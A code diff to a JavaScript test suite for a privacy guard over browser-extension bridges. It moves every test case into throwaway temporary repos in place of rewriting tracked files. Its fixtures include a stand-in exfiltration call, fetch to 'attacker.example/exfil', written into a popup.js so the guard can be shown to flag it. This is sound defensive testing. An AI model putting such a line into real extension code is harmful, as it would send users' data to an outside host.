@@ -25,8 +25,6 @@ const REPO = dirname(HERE);
 const SCRIPT_NAME = "check-bridge-privacy-surface.mjs";
 const SCRIPT = join(HERE, SCRIPT_NAME);
 const GOLDEN = join(HERE, "fixtures/bridge-privacy-surface.json");
-const POPUP = join(REPO, "packages/garmin-bridge/popup.js");
-const WHOOP_POPUP = join(REPO, "packages/whoop-bridge/popup.js");
 const WHOOP_CONTENT = join(REPO, "packages/whoop-bridge/content.js");
 
 const runGuard = () =>
@@ -34,39 +32,6 @@ const runGuard = () =>
     cwd: REPO,
     encoding: "utf8",
   });
-
-// Tracked files this suite rewrites in place, and the ONLY ones it may.
-//
-// `node --test` runs test files concurrently, so a sibling suite reading one
-// of these can observe a torn write: check-bridge-popup-message-parity reads
-// `packages/<bridge>/popup.js` at load time. That exposure predates this
-// suite and is tracked in #1096.
-//
-// The list is SHRINK-ONLY while that issue is open — enforced below and by
-// `withMutatedFile` itself, so a new in-place mutation fails immediately
-// rather than adding flake nobody notices. `packages/*/background.js` is
-// deliberately absent: check-bridge-core-parity reads those in full and
-// asserts on the `BRIDGE_MANIFEST` literal, so mutating one in place would
-// have grown the exposure. Those cases use `withTempRepo`.
-const MUTATED_REAL_FILES = [GOLDEN, POPUP, WHOOP_POPUP, WHOOP_CONTENT];
-
-// Apply `mutate` to `path`, hand the guard's result to `assertOn`, and always
-// restore the file.
-const withMutatedFile = (path, mutate, assertOn) => {
-  assert.ok(
-    MUTATED_REAL_FILES.includes(path),
-    `${path} is not in MUTATED_REAL_FILES. In-place mutation of a tracked file races sibling suites (#1096); stage this case with withTempRepo instead.`
-  );
-  const original = readFileSync(path, "utf8");
-  const tampered = mutate(original);
-  assert.notEqual(tampered, original, `mutation anchor missing in ${path}`);
-  writeFileSync(path, tampered);
-  try {
-    assertOn(runGuard());
-  } finally {
-    writeFileSync(path, original);
-  }
-};
 
 // Run the guard against a throwaway repo root: a temp directory holding a
 // copy of the script plus whatever `files` describes, keyed by repo-relative
@@ -152,23 +117,6 @@ const countQuotedPrefixLines = (body) =>
   body.split("\n").filter((line) => /^\s*"\/[^"]*",?\s*$/.test(line)).length;
 
 describe("bridge privacy surface guard", () => {
-  it("mutates no more tracked files than the debt already allows", () => {
-    // Shrink-only while #1096 is open. `node --test` runs test files
-    // concurrently and sibling suites read these paths — popup.js by
-    // check-bridge-popup-message-parity — so every entry here is a torn-read
-    // window. Growing the list grows the flake surface; withTempRepo does
-    // not. background.js is deliberately absent: check-bridge-core-parity
-    // reads it in full and asserts on the BRIDGE_MANIFEST literal.
-    assert.equal(
-      MUTATED_REAL_FILES.length,
-      4,
-      "in-place mutation of tracked files is shrink-only while #1096 is open"
-    );
-    for (const path of MUTATED_REAL_FILES) {
-      assert.doesNotMatch(path, /background\.js$/);
-    }
-  });
-
   it("passes against the checked-in golden", () => {
     const result = runGuard();
 
@@ -177,67 +125,100 @@ describe("bridge privacy surface guard", () => {
   });
 
   it("fails when the manifest permissions drift from the golden", () => {
-    const original = readFileSync(GOLDEN, "utf8");
-    const tampered = JSON.parse(original);
-    tampered["garmin-bridge"].manifest.permissions = [
-      "storage",
-      "tabs",
-      "webRequest",
-      "alarms",
-    ];
-    writeFileSync(GOLDEN, JSON.stringify(tampered, null, 2));
-
-    try {
-      const result = runGuard();
-      assert.equal(result.status, 1);
-      assert.match(result.stderr, /drifted from golden/);
-    } finally {
-      writeFileSync(GOLDEN, original);
-    }
-  });
-
-  it("fails on an absolute-URL fetch in popup.js", () => {
-    withMutatedFile(
-      POPUP,
-      (src) =>
-        `${src}\n// fixture line\nfetch("https://attacker.example/exfil");\n`,
+    // The golden pins the manifest surface; a permission appearing on disk
+    // that the golden does not list is the drift this guard exists to catch.
+    withTempRepo(
+      {
+        "packages/acme-bridge/manifest.json": JSON.stringify({
+          permissions: ["storage", "tabs", "webRequest", "alarms"],
+        }),
+        "packages/acme-bridge/background.js":
+          'const ALLOWED = [{ method: "GET", pattern: /^\\/ok$/ }];\n' +
+          "const AUTH_ENDPOINTS = [];\n",
+        "scripts/fixtures/bridge-privacy-surface.json": JSON.stringify({
+          "acme-bridge": {
+            manifest: {
+              permissions: [],
+              host_permissions: [],
+              content_scripts_matches: [],
+              externally_connectable_matches: [],
+            },
+            allowed_paths: [{ method: "GET", pattern: "^\\/ok$" }],
+            external_actions: [],
+            auth_endpoints: [],
+          },
+        }),
+      },
       (result) => {
         assert.equal(result.status, 1);
-        assert.match(result.stderr, /absolute-URL fetch/);
+        assert.match(result.stderr, /drifted from golden/);
+        // Bound from below: the golden and the on-disk allowlist agree, so
+        // `permissions` is the ONLY thing that can differ. Without naming it
+        // the case would pass on any unrelated drift.
+        assert.match(result.stderr, /webRequest/);
       }
     );
   });
 
-  it("fails when whoop's ALLOWED_PREFIXES gains an entry", () => {
-    // whoop declares its read allowlist as a plain string array
-    // (ALLOWED_PREFIXES), not the {method, pattern} shape. Until the
-    // extractor learned that shape, whoop's allowed_paths was [] in the
-    // golden and this widening produced zero CI failure — while the privacy
-    // policy asserted the allowlist as a durable property.
-    withMutatedFile(
-      WHOOP_CONTENT,
-      (src) =>
-        src.replace(
-          '"/health-service/v2/stress-bff",',
-          '"/health-service/v2/stress-bff",\n  "/membership-service/v1/affiliate",'
-        ),
+  it("fails on an absolute-URL fetch in popup.js, naming the bridge", () => {
+    // Covers every bridge at once: the guard discovers bridges from disk and
+    // scans each popup.js the same way, so pinning the case to a real
+    // package would only re-test the discovery loop. The real tree is
+    // covered by the guard itself running over it in `pnpm lint`.
+    withTempRepo(
+      {
+        ...syntheticBridge({
+          background: 'const ALLOWED = [{ method: "GET", pattern: /^\\/ok$/ }];\n',
+          allowedPaths: [{ method: "GET", pattern: "^\\/ok$" }],
+        }),
+        "packages/acme-bridge/popup.js":
+          'fetch("https://attacker.example/exfil");\n',
+      },
+      (result) => {
+        assert.equal(result.status, 1);
+        assert.match(result.stderr, /absolute-URL fetch/);
+        assert.match(result.stderr, /acme-bridge/);
+      }
+    );
+  });
+
+  it("fails when a prefix-shape allowlist gains an entry", () => {
+    // A read allowlist declared as a plain string array (ALLOWED_PREFIXES)
+    // rather than the {method, pattern} shape. Until the extractor learned
+    // this shape, such a bridge's allowed_paths stayed [] in the golden and
+    // a widening produced zero CI failure — while the privacy policy
+    // asserted the allowlist as a durable property.
+    withTempRepo(
+      {
+        "packages/acme-bridge/manifest.json": "{}",
+        "packages/acme-bridge/content.js": [
+          "const ALLOWED_PREFIXES = [",
+          '  "/health-service/v2/stress-bff",',
+          '  "/membership-service/v1/affiliate",',
+          "];",
+          "",
+        ].join("\n"),
+        "packages/acme-bridge/background.js": "const AUTH_ENDPOINTS = [];\n",
+        "scripts/fixtures/bridge-privacy-surface.json": JSON.stringify({
+          "acme-bridge": {
+            manifest: {
+              permissions: [],
+              host_permissions: [],
+              content_scripts_matches: [],
+              externally_connectable_matches: [],
+            },
+            allowed_paths: [
+              { method: "GET", prefix: "/health-service/v2/stress-bff" },
+            ],
+            external_actions: [],
+            auth_endpoints: [],
+          },
+        }),
+      },
       (result) => {
         assert.equal(result.status, 1);
         assert.match(result.stderr, /drifted from golden/);
         assert.match(result.stderr, /membership-service/);
-      }
-    );
-  });
-
-  it("covers whoop-bridge popup.js for absolute-URL exfil", () => {
-    withMutatedFile(
-      WHOOP_POPUP,
-      (src) =>
-        `${src}\n// fixture line\nfetch("https://attacker.example/exfil");\n`,
-      (result) => {
-        assert.equal(result.status, 1);
-        assert.match(result.stderr, /absolute-URL fetch/);
-        assert.match(result.stderr, /whoop-bridge/);
       }
     );
   });
@@ -640,9 +621,8 @@ describe("bridge privacy surface guard", () => {
   // because `/users/v3/token` ALSO sits in ALLOWED for the editor's session
   // probe — a coincidence that would evaporate with that entry.
   //
-  // Every case below stages its bridge with withTempRepo: garmin-oauth.js
-  // and tp-auth.js are not in MUTATED_REAL_FILES and that list is
-  // shrink-only.
+  // Every case below stages its bridge with withTempRepo — as every case in
+  // this suite now does. Nothing here rewrites a tracked file.
 
   const authBridge = (body, endpoints = []) =>
     syntheticBridge({
